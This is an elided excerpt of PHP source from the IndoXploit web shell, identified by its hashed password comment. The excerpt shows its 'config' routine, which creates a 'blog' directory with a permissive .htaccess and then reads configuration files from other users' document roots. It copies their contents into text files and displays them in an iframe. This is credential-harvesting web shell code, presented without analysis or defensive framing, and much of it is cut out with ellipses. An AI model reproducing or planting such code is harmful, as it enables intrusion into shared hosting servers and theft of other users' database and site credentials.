...
// $password = "544a945a31ba6c074b5459cfbab946b2"; # md5: IndoXploit
...
function action() {
	...
	if(isset($_GET['do'])) {
		...
		elseif($_GET['do'] === "config") {
			if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'blog'."));
			if(!is_dir(path()."/blog/")) {
				@mkdir('blog', 0755);
				$htaccess = "Options all\nDirectoryIndex indoxploit.htm\nSatisfy Any";
				save("blog/.htaccess","w", $htaccess);
					...
					if(is_readable($user_docroot)) {
						...
						foreach($getconfig as $config => $userconfig) {
							...
							if($get == '') {
								...
								$fopen = fopen("blog/$user-$userconfig.txt", "w");
								fputs($fopen, $get);
							}
						}
					}
			...
			print "<div style='background: #ffffff; width: 100%; height: 100%'>";
			print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/blog/' frameborder='0' scrolling='yes'></iframe>";
			print "</div>";
		}
